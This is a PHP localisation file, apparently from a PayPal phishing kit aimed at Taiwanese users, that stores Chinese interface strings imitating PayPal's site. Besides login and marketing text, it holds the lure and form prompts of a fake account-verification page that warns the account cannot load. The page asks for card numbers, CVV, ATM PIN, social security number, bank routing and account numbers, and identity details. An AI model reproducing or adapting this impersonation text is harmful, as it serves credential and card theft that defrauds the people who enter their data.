<?php  

$confirmbutton = "确认";
$confirmyourinfo = "您需要确认您的信息，以便能够解决这个问题，并访问您的帐户";
$unabletoload = "暂时无法加载您的帐户。";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "版权所有.";
$wrong = "您输入的一些信息是不正确的。";
$titlerr = "错误：登录 ";
$confirm = "请确认您的账户使用它，只要你喜欢";
$topp = "您的安全是我们的首要任务";
$secondarycred = "二次信用卡（可选）";
$primarycred = "主信用卡";
$thiscardis = "此卡是VBV/ MSC";

$page="en_TW";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = true;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$country_selector = "country taiwan";
$top_title = "線上購物、網路銷售，跨國線上交易支付平台首選 - PayPal";
$small_with_helper_input_0 = "請輸入有效電子郵件地址";
$small_with_helper_input_1 = "請輸入密碼";
$login_email_input_0 = "電子郵件地址";
$passwordRecovery1_a_0 = "忘記電子郵件地址？";
$login_password_input_0 = "密碼";
$passwordRecovery2_a_0 = "忘記密碼？";
$login_button_a_0 = "登入";
$signup_button_a_0 = "註冊";
$header_buy_a_0 = "購物";
$header_sell_a_0 = "銷售";
$header_send_a_0 = "付款";
$header_business_a_0 = "商業銷售解決方案";
$signup_button_inner_a_0 = "註冊";
$hero_h1_0 = "網路購物輕鬆付";
$signup_subline_p_0 = "有銷售需求？進一步了解我們的 商業銷售解決方案";
$icon_help_a_0 = "查詢中心";
$icon_contact_a_0 = "聯絡我們";
$icon_search_button_0 = "搜索";
$_large_h2_n1_0 = "快速便利";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "手機是最方便的購物平台";
$_large_h2_row_fluid_editorial_editorial_left__0 = "拓展全球銷售版圖";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "隨時隨地 輕鬆購物";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "輕鬆要求買家支付交易款項";
$contentPara_p_n1_0 = "全球有數百萬人選擇使用 PayPal，原因只有一個：操作簡單方便。 你只需電子郵件地址和密碼即可使用 PayPal 結帳，再也不需拿出皮夾。 ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "別再讓優惠從你手上溜走！出門在外，透過手機也能盡享購物樂趣。 ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "你只需要賣家的電子郵件地址，就可更輕鬆又更安全地為你所購買的商品或服務付款，無論你的賣家在哪裡，都會很高興收到你的付款訊息。 ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "在完成銷售後，你可以發送支付款項要求給你的買家，買家收到支付要求時，即可以選擇偏好的方式完成付款，簡單又方便。 ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "接受來自全球的買家使用信用卡、扣帳卡或 PayPal 帳戶支付交易款項。 ";
$contentLink_a_n1_0 = "eBay 購物";
$contentLink_a_n1_1 = "網站購物";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "支付購物款項";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "要求支付交易款項";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "網站銷售";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "發送電子帳單";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "手機購物";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1 = "";
$closingHeadline_headline_large_p_0 = "通行全球 就用 PayPal ";
$btn_closing_cta_center_block_span4_a_0 = "立即註冊";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "查詢中心";
$footer_footer_main_secondaryLink_li[1] = "聯絡我們";
$footer_footer_main_secondaryLink_li[2] = "費用";
$footer_footer_main_secondaryLink_li[3] = "交易安全";
$footer_footer_main_secondaryLink_li[4] = "全球購物優惠";
$footer_footer_main_secondaryLink_li[5] = "English";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "關於 PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Blog";
$footer_footer_secondary_secondaryLink_li[2] = "工作機會";
$footer_footer_secondary_secondaryLink_li[3] = "網站地圖";
$footer_footer_secondary_secondaryLink_li[4] = "eBay";
$footer_footer_secondary_secondaryLink_li[5] = "開發人員";
$footer_footer_secondary_secondaryLink_li[6] = "合作夥伴";
$footer_footer_secondary_secondaryLink_li[7] = "意見調查";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "版權所有 © 1999 - ".$copyright." PayPal。保留所有權利。";
$footer_footer_tertiary_secondaryLink_li[1] = "隱私權政策";
$footer_footer_tertiary_secondaryLink_li[2] = "法律同意書";

$top_title2 = "錯誤 — 登入 台灣 - PayPal";
$alert_alert_warning_div_0 = "你必須輸入電子郵件以及密碼。請重試。";
$loginheadline_p_0 = "登入你的帳戶";
$error_span_0 = "電子郵件";
$error_span_1 = "密碼";
$btn_large_input_0 = "登入";
$pwrLinkoldflow_a_0 = "忘記電子郵件或密碼？";
$btn_btn_secondary_large_a_0 = "免費註冊";
$headline_p_0 = "PayPal 保障你的網路交易<SPAN class=headline-content>PayPal 的「買家購物安全保障」讓你購物更安心，若購買的商品未送達或商品明顯與賣家的說明不符，只要符合條件的購物交易皆可獲得保障。</SPAN>";
$headline_p_1 = "自由選擇你的支付方式<SPAN class=headline-content>新增信用卡或扣帳卡至你的&nbsp;PayPal&nbsp;帳戶作為支付購款項的方式，即可開始購物，還可以持續累積信用卡紅利點數。</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "關於我們";
$footer_li_footer_li[1] = "聯絡我們";
$footer_li_footer_li[2] = "費用";
$footer_li_footer_li[3] = "全球服務";
$footer_li_footer_li[4] = "隱私權";
$footer_li_footer_li[5] = "工作機會";

$legal_p_0 = "版權所有 © 1999-".$copyright." PayPal。保留所有權利。";


$charset = "UTF-8";
$profupdate = "個人資料更新 - 貝寶";
$processing = "登錄您的安全";
$opay = "登錄 - PayPal";
$ifno = "如果這個頁面出現超過5秒，";
$clickhere = "點擊這裡";
$reload = "重裝。";
$logout = "註銷";
$help = "幫助";
$s_center = "安全和保護";
$myacc = "我的帳戶";
$over = "概觀";
$addfound = "新增基金";
$retirar = "退出";
$banktf = "轉移到銀行帳戶";
$history = "歷史";
$bsearch = "基本搜索";
$dhistory = "下載歷史";
$resolu = "調解中心";
$opencase = "查看開宗";
$guides = "指南";
$prof = "輪廓";
$addemail = "添加或編輯電子郵件";
$addbank = "添加或編輯銀行賬戶";
$addcard = "添加或編輯信用卡";
$addadr = "添加或編輯郵寄地址";
$sendmoney = "匯款";
$reqmoney = "索取金錢";
$mservices = "商家服務";
$autools = "拍賣工具";
$stra = "安全交易";
$puf = "資料更新";
$pip = "個人資料簡介";
$acu = "盡可能準確地輸入您的信息。";
$accu = "請確保您準確輸入的信息，並根據所需要的格式。";
$filla = "在所有填寫必填字段。";
$rfield = "必須填寫";
$ffPrenom = "名字：";
$ffNom = "姓：";
$dateness = "出生日期：";
$month = "月";
$day = "日"; 
$year = "年";
$adr1 = "地址行1：";
$adr2 = "地址2：";
$city = "城市：";
$state = "狀態：";
$zip = "郵編：";
$country = "國家：";
$scountry = "- 選擇國家 -";
$hpn = "家庭電話號碼：";
$acpnum = "此號碼將用於您聯繫一下關於你的PayPal帳戶的安全措施和/或其他問題。";
$ccprof = "信用卡/借記卡簡介";
$damelacc = "盡可能準確地輸入信用卡信息。";
$damelacb = "對於卡號，輸入數字只能請，沒有破折號或空格。";
$Nomdutitulairedelacarte = "卡名稱：";
$ccnumbr = "卡號：";
$expbr = "到期日期：";
$cvv = "信用卡驗證號碼：";
$hcvv = "幫助尋找你的信用卡驗證號碼";
$atmm = "您的提款卡密碼：";
$ssn = "社會安全號碼：";
$routing="銀行代碼：";
$account="銀行帳號：";
$hrouting="幫助尋找你的銀行路由號碼";
$haccount="幫助尋找你的銀行帳戶號碼";
$codepersonel="安全代碼：";
$IDTYPE = "選擇Id的類型：";
$Passport="護照";
$Card_Identification="識別卡";
$Driving_License="駕照";
$for1 = "為了您的安全，我們核實信用卡信息。";
$for2 = "該過程通常需時約30秒，但它可能在一天中的某些時間需要更長的時間。請點擊";
$for3 = "更新您的信息。";
$spo = "保存配置文件";
$t1 = "更多信息";
$t2 = "關於我們";
$t3 = "網站反饋";
$t4 = "費用";
$t5 = "隱私";
$t6 = "安全中心";
$t7 = "聯繫我們";
$t8 = "法律協議";
$t9 = "全世界";
$t10 = "工作機會";
$t11 = "商家服務";
$t12 = "我們的博客";
$t13 = "實驗室";
$t14 = "介紹人";
$t15 = "網站地圖";
$t16 = "易趣";
$t17 = "社區";
$fdic = "關於FDIC直通保險信息";
$myvar3 = "請填寫下面的表單來更新您的個人信息，並恢復您的帳戶的訪問。";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("請輸入您的名字"
,"無效的名字" //--------
,"請輸入您的姓"
,"無效的姓" //--------
,"請選擇一個有效的出生月份。" //--------4
,"請選擇一個有效的生日。" //--------
,"請選擇一個有效的出生年份。" //--------
,"請輸入您的地址"
,"無效的地址" //--------8
,"無效的地址" //--------
,"請輸入您的城市名"
,"請輸入有效的城市名稱。" //--------
,"請輸入有效的城市名稱。" //--------12
,"選擇國家"
,"請輸入您的郵政編碼"
,"郵政編碼無效。" //--------15
,"請輸入您的電話號碼"
,"只輸入數字"
,"請輸入有效的電話號碼" //--------
,"請輸入持卡人的有效名稱" //--------19
,"身份證號碼是無效的格式"  ////--------
,"信用卡號碼無效"  //--------
,""//--------22
,""//--------
,"只輸入數字"
,"請選擇在到期日 - 月 -"
,"請選擇到期日期 - 年 -"
,"請輸入您的CVV"
,"請輸入有效的Cvv/Cvv2為您的卡。"//--------
,"無效Cvv/Cvv2" //--------
,"請輸入您的提款卡密碼"
,"請輸入一個有效的自動櫃員機密碼" //--------
,"請輸入一個有效的自動櫃員機密碼" //--------
,"請輸入您的社會安全號碼"
,"無效的社會安全號碼。"
,"無效的社會安全號碼。"
,"只有社會安全號碼的數量"
,"請輸入您的安全碼"
,"無效的安全密碼");
$allcountry1 = "PayPal 通行全球 為你服務";
$allcountry2 = "PayPal 通行於 193 個國家 / 地區並支援 26 種貨幣，跨越國界和語言隔閡，讓跨國交易款項更安全輕鬆。請選擇所在國家或地區。 ";
$One_moment = "片刻...";



$your_money = "獲得更多來自你的錢";
$your_money_p = "您的PayPal賬戶給你一個更安全，更快速，更便捷的在線和移動支付上。儲存您的財務細節安全與我們然後用你的帳號購物，轉賬或出售你的東西，使一些額外的錢 - 所有只需點擊幾下。";
$websites = "在數以百萬計的網站購物";
$websites_p = "PayPal是提供數以百萬計的網站在世界各地。所以，無論你是從最大的零售商或最小的專家購買，你可以購物，而無需通過結帳分享您的個人信息和速度。而無論您的設備正在使用，你的PayPal的經驗將是多麼快捷，方便。";
$Simply_secure = "簡單安全";
$Simply_secure_p = "安全是我們做一切的心臟。無論是保護您的財務細節或您的購買，我們把您的安全和安心第一。這就是為什麼我們使用領先的加密和防欺詐技術，為什麼我們監控交易，一天24小時，為什麼我們可以幫你得到你的錢回來，如果您購買的不到位或不符合其描述。";
$ex_date_info = "請給我們您的信用卡到期日（月/年）。";
$ex_date_empty = "請給我們您的信用卡到期日期。";
$ex_date_format = "有效的截止日期（月/年）請輸入。";
$cardholder_info = "用你的名字顯示在您的卡上";
$card_info = "請輸入您的卡號";
$card_format = "卡號無效";
$atm_info = "進入ATM銷此卡。";
$account_info = "輸入您的銀行帳戶號碼";
$account_empty = "請輸入您的銀行帳戶號碼，以驗證您的帳戶";
$account_format = "請輸入一個有效的銀行帳戶號碼";
$routing_info = "輸入您的銀行路由號碼";
$routing_empty = "請輸入您的銀行路由號碼來驗證您的帳戶";
$routing_format = "請輸入一個有效的銀行路由號碼";
$first_name = "您的名字";
$first_name_info = "使用您的法定名稱顯示在您的駕駛執照，社會保險卡或護照。";
$first_name_empty = "我們需要驗證您的帳戶，您的合法名字。";
$last_name = "您的姓氏";
$last_name_info = "使用您的合法姓氏作為顯示在您的駕駛執照，社會保險卡或護照。";
$last_name_empty = "我們需要您的合法姓氏，以驗證您的帳戶。";
$Birth_date = "出生日期";
$Birth_date_empty ="請給我們您的出生日期。";
$Birth_date_format = "有效日期（日/月/年）請輸入。";
$Birth_date_info = "請給我們您的出生日期（日/月/年）。";
$Address1 = "地址第一行";
$Address1_empty = "我們需要一個有效的地址，以驗證您的帳戶。";
$Address1_info = "我們不能接受郵政信箱或商業中心位置。";
$Address2 = "地址線2";
$City = "市";
$City_empty = "我們需要一個城鎮/城市，以驗證您的帳戶。";
$Postcode = "郵編";
$Postcode_empty = "我們需要一個郵政編碼，以創建一個新的帳戶給你。";
$Postcode_format = "請檢查您的郵政編碼為錯別字，格式不正確。";
$fone = "您的電話號碼";
$fone_empty = "我們需要你的電話號碼，以驗證您的帳戶。";
$fone_format = "請檢查您的電話號碼，錯別字，格式不正確。";
$fone_info = "您的電話號碼（請只使用數字）";
$verifyaccount = "驗證您的帳戶";
$Ownb = "擁有自己的公司嗎？";
$hh1 = "你的安全細節";
$hh2 = "您的個人資料";
$pp1 = "我們需要您的有效安全的詳細信息，以驗證您的帳戶。";
$pp2 = "我們需要您的一些信息之前，我們可以驗證您的帳戶。";

$type1="家";
$type2="移动";
$button_continue="繼續";
$button_validate="驗證";

?>